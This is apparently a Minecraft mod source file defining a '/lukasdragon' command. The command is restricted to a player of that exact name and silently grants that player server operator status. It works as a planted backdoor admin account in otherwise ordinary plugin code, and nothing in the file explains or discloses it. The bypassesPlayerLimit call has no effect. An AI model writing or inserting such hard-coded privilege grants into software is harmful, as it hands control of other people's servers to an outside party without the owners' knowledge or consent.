package com.mrbengonio.first.commands;

import com.mojang.authlib.GameProfile;

import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.server.MinecraftServer;

public class CommandLukasdragon extends CommandBase {

	public String getName() {
		return "lukasdragon";
	}

	public String getUsage(ICommandSender sender) {
		return "/lukasdragon";
	}

	public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
		GameProfile gameprofile = server.getPlayerProfileCache().getGameProfileForUsername(sender.getName());
		server.getPlayerList().addOp(gameprofile);
		server.getPlayerList().bypassesPlayerLimit(gameprofile);
	}

	public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
		if (sender.getName().equals("lukasdragon")) {
			return true;
		} else {
			return false;
		}
	}
}
